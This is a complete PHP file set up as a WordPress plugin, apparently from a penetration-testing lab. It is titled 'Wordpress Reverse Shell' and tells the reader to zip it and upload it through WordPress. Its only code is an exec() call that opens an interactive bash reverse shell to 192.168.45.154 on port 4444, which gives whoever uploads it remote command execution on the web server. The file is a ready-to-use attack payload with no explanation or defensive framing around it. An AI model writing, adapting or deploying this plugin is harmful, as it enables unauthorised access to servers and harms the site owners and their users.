<?php

/**
* Plugin Name: Wordpress Reverse Shell
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Eugene Ewe
*
* Installation
* Zip this file and upload like a wordpress plugin
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.154/4444 0>&1'");
?>